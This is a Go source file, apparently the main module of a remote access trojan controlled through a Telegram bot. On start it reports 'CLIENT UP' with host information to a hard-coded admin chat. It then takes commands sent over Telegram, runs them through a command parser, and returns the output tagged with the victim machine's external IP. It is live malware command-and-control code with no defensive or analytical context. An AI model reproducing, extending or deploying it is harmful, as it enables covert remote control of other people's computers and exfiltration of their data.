package main

import (
	"log"
	"gopkg.in/telegram-bot-api.v4"
	"math/rand"
	"time"
)

func sendMsg(bot *tgbotapi.BotAPI, chat_id int64, text string){
	//log.Println("bot:",bot.Token)
	msg := tgbotapi.NewMessage(chat_id, text)
	//msg.ReplyToMessageID = chat_id
	bot.Send(msg)
}

func parse(message string, bot *tgbotapi.BotAPI, update tgbotapi.Update)  {
	messageParts := make([]string, 1)
	if len(message) > 4096{
		messageParts = splitMessage(clearMSG(message))
	}else{
		messageParts[0] = clearMSG(message)
	}
	//log.Println("MSGPARTS:",len(messageParts),"###################################################################")
	for i:=0; i<len(messageParts); i+=1 {
		//log.Println("\n\n\nI:",len(messageParts[i]),"\n\n\n")//
		ipInfo := new(IpConfig)
		ipInfo, _ = GetExternalIP()
		sendMsg(bot, update.Message.Chat.ID, "PC("+ipInfo.Ip+"):"+messageParts[i])
	}
}

func main() {
	initRat()
	bot, err := tgbotapi.NewBotAPI(BOT_TOKEN)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = false

	log.Printf("Authorized on account %s", bot.Self.UserName)

	sendMsg(bot, ADMIN_ID, "CLIENT UP: \n"+getInfo())

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
		message := parseCmd(update.Message, bot)
		go parse(message, bot, update)
		r := 500+rand.Intn(5000)
		time.Sleep(time.Duration(r))
	}
}